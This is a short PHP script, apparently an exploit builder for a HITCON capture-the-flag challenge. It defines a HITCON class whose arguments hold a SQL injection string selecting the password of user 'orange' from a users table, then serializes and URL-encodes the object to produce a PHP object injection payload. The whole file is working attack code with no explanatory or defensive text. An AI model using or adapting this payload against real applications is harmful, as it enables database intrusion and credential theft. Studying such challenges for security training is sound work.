<?php
class HITCON{
    private $method="show";
    private $args=array("' union select password,1,1 from users where username = 'orange'#");
    private $conn;
}
$hit = new HITCON();
$result = serialize($hit);
echo urlencode($result);